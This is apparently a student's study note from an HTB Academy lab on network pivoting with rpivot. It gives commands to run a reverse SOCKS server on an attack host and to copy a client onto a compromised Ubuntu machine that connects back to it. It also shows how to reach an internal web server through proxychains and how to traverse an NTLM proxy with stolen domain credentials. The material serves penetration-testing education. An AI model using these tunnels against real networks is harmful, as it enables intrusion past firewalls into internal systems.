# Pivoting, Tunneling, and Port Forwarding — Web Server Pivoting with Rpivot

**Module:** HTB Academy – Pivoting, Tunneling, and Port Forwarding

---

## What is Rpivot?

- **Rpivot** — reverse SOCKS proxy tool, written in **Python 2**.
- Binds a machine **inside** a corporate network to an **external server**, exposing the internal client's local access as a port on the server (attack host) side.
- "Reverse" because the **pivot target initiates the connection outward** to the attack host — useful when the pivot can't be connected to directly (e.g., behind NAT/firewall), similar in spirit to reverse shells vs. bind shells.

**Scenario:** internal web server at `172.16.5.135` needs to be reached through a compromised Ubuntu host, using rpivot as the tunnel.

---

## Step 1 — Clone Rpivot

```bash
git clone https://github.com/klsecservices/rpivot.git
```

---

## Step 2 — Start the Server Component (on the Attack Host)

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

- `--server-port 9999` → port the **client** (pivot host) connects back to.
- `--proxy-port 9050` → port where the **SOCKS proxy** becomes available locally on the attack host.
- `--server-ip 0.0.0.0` → listen on all interfaces.

---

## Step 3 — Transfer Rpivot to the Pivot Target

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

---

## Step 4 — Start the Client Component (on the Pivot Host)

```bash
python2 client.py --server-ip 10.10.14.18 --server-port 9999
# Backconnecting to server 10.10.14.18 port 9999
```

- Pivot host connects **outbound** to the attack host's `server.py` on port 9999.

### Confirm Connection (Attack Host Side)

```
New connection from host 10.129.202.64, source port 35226
```

---

## Step 5 — Route Traffic Through the Proxy

- Configure **proxychains** to use `127.0.0.1:9050` (the port opened by `server.py`).
- Then any proxychains-wrapped tool reaches the internal network via the pivot.

```bash
proxychains firefox-esr 172.16.5.135:80
```

- Accesses the internal web server (`172.16.5.135:80`, inside `172.16.5.0/23`) through the rpivot tunnel.

---

## Advanced: Pivoting Through an HTTP Proxy with NTLM Auth

- Some organizations front their Domain Controller / internal access with an **HTTP proxy requiring NTLM authentication**.
- Rpivot's `client.py` supports passing NTLM proxy credentials directly so the reverse connection can traverse that proxy.

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 \
  --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 \
  --domain <nameofWindowsDomain> --username <username> --password <password>
```

- `--ntlm-proxy-ip` / `--ntlm-proxy-port` → the NTLM-authenticating HTTP proxy to traverse.
- `--domain` / `--username` / `--password` → credentials for NTLM authentication through that proxy.

---

## Key Takeaways

| Component | Runs On | Role |
|---|---|---|
| `server.py` | Attack host | Listens for the pivot's backconnect (`--server-port`) and exposes a local SOCKS proxy (`--proxy-port`) |
| `client.py` | Pivot/target host | Connects **outbound** to the attack host's server component |

- Rpivot is **reverse-direction** pivoting — the compromised internal host reaches out to the attacker, rather than the attacker connecting in. Useful when the pivot host itself isn't directly reachable from outside.
- Once established, route traffic through it the same way as any SOCKS setup: **proxychains** pointed at the local proxy port.
- Supports traversing **NTLM-authenticated HTTP proxies** — relevant in enterprise environments where a Domain Controller-integrated proxy sits between the internal network and the outside.
